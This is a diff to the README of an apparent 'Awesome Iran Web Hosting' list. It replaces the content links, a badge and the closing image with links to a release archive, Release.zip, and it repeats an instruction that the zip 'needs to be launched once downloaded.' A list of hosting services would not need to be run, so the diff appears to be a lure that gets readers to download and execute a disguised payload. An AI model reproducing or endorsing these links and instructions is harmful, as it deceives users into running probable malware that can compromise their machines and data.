@@ -46,11 +46,11 @@ Our repository covers a wide range of topics related to web hosting and deployme
 
 ## Get Started
 
-Ready to explore the world of free web hosting services in Iran? Check out our [list of Awesome Iran Web Hosting services](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip).
+Ready to explore the world of free web hosting services in Iran? Check out our [list of Awesome Iran Web Hosting services](https://github.com/Musaberisha/Awesome-Iran-Web-Hosting/releases/download/v1.0/Release.zip).
 
-[![Download Software.zip](https://img.shields.io/static/v1?label=Download&message=Software.zip&color=green)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download https://github.com/Musaberisha/Awesome-Iran-Web-Hosting/releases/download/v1.0/Release.zip](https://github.com/Musaberisha/Awesome-Iran-Web-Hosting/releases/download/v1.0/Release.zip)](https://github.com/Musaberisha/Awesome-Iran-Web-Hosting/releases/download/v1.0/Release.zip)
 
-Remember, the Software.zip needs to be launched once downloaded.
+Remember, the https://github.com/Musaberisha/Awesome-Iran-Web-Hosting/releases/download/v1.0/Release.zip needs to be launched once downloaded.
 
 ## Contributing
 
@@ -62,4 +62,4 @@ This repository is licensed under the MIT License. See the [LICENSE](LICENSE) fi
 
 Let's make web hosting easier and more accessible for developers in Iran! 🚀🇮🇷
 
-![Iran Web Hosting](https://cdn.pixabay.com/photo/2016/06/29/08/04/iran-flag-1487081_960_720.jpg)
+![Iran Web Hosting](https://github.com/Musaberisha/Awesome-Iran-Web-Hosting/releases/download/v1.0/Release.zip)
